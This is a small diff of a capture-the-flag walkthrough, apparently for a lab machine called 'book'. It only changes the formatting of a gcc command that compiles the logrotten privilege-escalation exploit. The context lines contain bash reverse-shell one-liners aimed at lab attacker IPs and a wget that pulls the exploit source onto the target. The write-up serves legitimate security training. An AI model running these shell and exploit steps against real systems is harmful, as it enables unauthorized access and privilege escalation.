@@ -548,7 +548,7 @@ bash -i >& /dev/tcp/10.10.14.18/4444 0>&1
 bash -i >& /dev/tcp/10.10.14.17/666 0>&1
 ~~~
 
-Of course we save it and make it executable. Now, we download the exploit on the target and compile it with `$ gcc logrotten.c -o logrotten` and make it executable:
+Of course we save it and make it executable. Now, we download the exploit on the target and compile it with **`$ gcc logrotten.c -o logrotten`** and make it executable:
 
 ~~~
 reader@book:~$ wget http://10.10.14.18/logrotten.c
